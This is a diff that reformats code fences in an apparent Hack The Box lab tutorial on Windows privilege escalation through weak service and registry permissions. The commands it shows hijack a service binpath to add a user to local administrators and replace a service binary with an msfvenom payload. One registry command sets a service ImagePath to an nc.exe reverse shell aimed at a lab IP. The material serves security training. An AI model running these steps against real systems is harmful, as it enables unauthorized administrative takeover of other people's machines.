@@ -12,8 +12,7 @@ Permissions on Windows systems are complicated and challenging to get right. A s
 
 We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
 
-```
-        powershell
+```powershell
 PS C:\htb> .\SharpUp.exe audit
 
 === SharpUp: Running Privilege Escalation Checks ===
@@ -36,8 +35,7 @@ The tool identifies the `PC Security Management Service`, which executes the `Se
 
 Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.
 
-```
-        powershell
+```powershell
 PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 
 C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
@@ -54,8 +52,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.
 
-```
-        cmd
+```bat
 C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 C:\htb> sc start SecurityService
 ```
@@ -68,8 +65,7 @@ C:\htb> sc start SecurityService
 
 Let's check the `SharpUp` output again for any modifiable services. We see the `WindscribeService` is potentially misconfigured.
 
-```
-        cmd
+```bat
 C:\htb> SharpUp.exe audit
  
 === SharpUp: Running Privilege Escalation Checks ===
@@ -89,8 +85,7 @@ C:\htb> SharpUp.exe audit
 
 Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). Here we can see that all Authenticated Users have [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.
 
-```
-        cmd
+```bat
 C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
  
 Accesschk v6.13 - Reports effective permissions for securable objects
@@ -111,8 +106,7 @@ WindscribeService
 
 Checking the local administrators group confirms that our user `htb-student` is not a member.
 
-```
-        cmd
+```bat
 C:\htb> net localgroup administrators
 
 Alias name     administrators
@@ -130,8 +124,7 @@ The command completed successfully.
 
 We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).
 
-```
-        cmd
+```bat
 C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
 
 [SC] ChangeServiceConfig SUCCESS
@@ -141,8 +134,7 @@ C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrator
 
 Next, we must stop the service, so the new `binpath` command will run the next time it is started.
 
-```
-        cmd
+```bat
 C:\htb> sc stop WindscribeService
  
 SERVICE_NAME: WindscribeService
@@ -159,8 +151,7 @@ SERVICE_NAME: WindscribeService
 
 Since we have full control over the service, we can start it again, and the command we placed in the `binpath` will run even though an error message is returned. The service fails to start because the `binpath` is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the `binpath`.
 
-```
-        cmd
+```bat
 C:\htb> sc start WindscribeService
 
 [SC] StartService FAILED 1053:
@@ -172,8 +163,7 @@ The service did not respond to the start or control request in a timely fashion.
 
 Finally, check to confirm that our user was added to the local administrators group.
 
-```
-        cmd
+```bat
 C:\htb> net localgroup administrators
 
 Alias name     administrators
@@ -198,8 +188,7 @@ We can clean up after ourselves and ensure that the service is working correctly
 
 #### Reverting the Binary Path
 
-```
-        cmd
+```bat
 C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
 
 [SC] ChangeServiceConfig SUCCESS
@@ -209,8 +198,7 @@ C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\W
 
 If all goes to plan, we can start the service again without an issue.
 
-```
-        cmd
+```bat
 C:\htb> sc start WindScribeService
  
 SERVICE_NAME: WindScribeService
@@ -229,8 +217,7 @@ SERVICE_NAME: WindScribeService
 
 Querying the service will show it running again as intended.
 
-```
-        cmd
+```bat
 C:\htb> sc query WindScribeService
  
 SERVICE_NAME: WindScribeService
@@ -251,8 +238,7 @@ When a service is installed, the registry configuration specifies a path to the 
 
 #### Service Binary Path
 
-```
-        shellsession
+```shellsession
 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
 ```
 
@@ -265,8 +251,7 @@ Windows will decide the execution method of a program based on its file extensio
 
 #### Querying Service
 
-```
-        cmd
+```bat
 C:\htb> sc qc SystemExplorerHelpService
 
 [SC] QueryServiceConfig SUCCESS
@@ -294,8 +279,7 @@ However, creating files in the root of the drive or the program files folder req
 
 We can identify unquoted service binary paths using the command below.
 
-```
-        cmd
+```bat
 C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
 GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
 System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
@@ -310,8 +294,7 @@ It is also worth searching for weak service ACLs in the Windows Registry. We can
 
 #### Checking for Weak Service ACLs in Registry
 
-```
-        cmd
+```bat
 C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
 
 Accesschk v6.13 - Reports effective permissions for securable objects
@@ -328,8 +311,7 @@ RW HKLM\System\CurrentControlSet\services\ModelManagerService
 
 We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:
 
-```
-        powershell
+```powershell
 PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
 ```
 
@@ -341,8 +323,7 @@ PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelM
 
 We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
 
 Name     : OneDrive
